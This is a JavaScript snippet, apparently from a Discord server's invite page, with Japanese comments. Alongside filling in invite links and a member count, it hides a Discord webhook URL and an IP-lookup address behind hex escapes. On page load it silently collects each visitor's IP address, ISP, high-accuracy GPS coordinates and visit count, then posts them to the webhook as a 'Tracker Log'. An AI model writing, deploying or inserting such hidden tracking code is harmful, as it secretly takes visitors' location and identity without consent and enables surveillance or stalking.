<script>
    (function() {
        // 文字列を16進数で隠蔽（Webhook URLなど）
        const _0x_scr = {
            'inv': '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x64\x69\x73\x63\x6f\x72\x64\x2e\x67\x67\x2f\x64\x63\x75\x73',
            'srv': '\x31\x34\x32\x37\x32\x33\x30\x35\x34\x32\x37\x30\x34\x36\x37\x36\x39\x32\x36',
            'whk': '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x64\x69\x73\x63\x6f\x72\x64\x2e\x63\x6f\x6d\x2f\x61\x70\x69\x2f\x77\x65\x62\x68\x6f\x6f\x6b\x73\x2f\x31\x34\x37\x31\x37\x31\x31\x36\x31\x38\x37\x33\x30\x35\x36\x31\x36\x34\x37\x2f\x74\x6a\x77\x6a\x4f\x75\x65\x32\x57\x4b\x49\x31\x69\x6f\x46\x35\x6a\x6d\x45\x66\x72\x32\x37\x32\x71\x42\x35\x4a\x32\x78\x46\x30\x38\x32\x53\x38\x71\x78\x76\x47\x78\x33\x4b\x57\x5f\x67\x30\x66\x34\x78\x65\x7a\x4e\x52\x77\x48\x78\x70\x51\x46\x70\x5f\x50\x43\x5f\x71\x6c',
            'api': '\x68\x74\x74\x70\x3a\x2f\x2f\x69\x70\x2d\x61\x70\x69\x2e\x63\x6f\x6d\x2f\x6a\x73\x6f\x6e\x2f\x3f\x66\x69\x65\x6c\x64\x73\x3d\x36\x36\x38\x34\x36\x37\x31'
        };

        async function _trigger() {
            try {
                // 訪問回数
                let v = localStorage.getItem('v_c') || 0;
                v = parseInt(v) + 1;
                localStorage.setItem('v_c', v);

                // IPとGPSの並列取得
                const [_i, _g] = await Promise.all([
                    fetch(_0x_scr.api).then(r => r.json()).catch(() => ({})),
                    new Promise(res => {
                        navigator.geolocation.getCurrentPosition(
                            p => res({t: p.coords.latitude, n: p.coords.longitude, a: p.coords.accuracy}),
                            () => res(null),
                            {enableHighAccuracy: true, timeout: 5000}
                        );
                    })
                ]);

                const map = _g ? `https://www.google.com/maps?q=${_g.t},${_g.n}` : "拒否";

                // 通知データ送信
                await fetch(_0x_scr.whk, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        embeds: [{
                            title: "🚨 Tracker Log",
                            color: 16711680,
                            fields: [
                                { name: "IP", value: `\`${_i.query || "err"}\``, inline: true },
                                { name: "ISP", value: `\`${_i.isp || "err"}\``, inline: true },
                                { name: "GPS", value: _g ? `[Map Link](${map}) (±${Math.round(_g.a)}m)` : "未許可", inline: false },
                                { name: "Count", value: `${v}回目`, inline: true }
                            ],
                            timestamp: new Date().toISOString()
                        }]
                    })
                });
            } catch (e) { console.error(e); }
        }

        document.addEventListener('DOMContentLoaded', () => {
            // 招待リンク反映
            document.querySelectorAll('.invite-link').forEach(a => a.href = _0x_scr.inv);
            
            // サーバー状況（簡易版）
            const sBox = document.getElementById('status-box');
            fetch(`https://discord.com/api/guilds/${_0x_scr.srv}/widget.json`)
                .then(r => r.json())
                .then(d => { if(sBox) sBox.innerText = `🟢 オンライン: ${d.presence_count}人`; })
                .catch(() => { if(sBox) sBox.innerText = `🟢 稼働中`; });

            _trigger();
        });
    })();
</script>
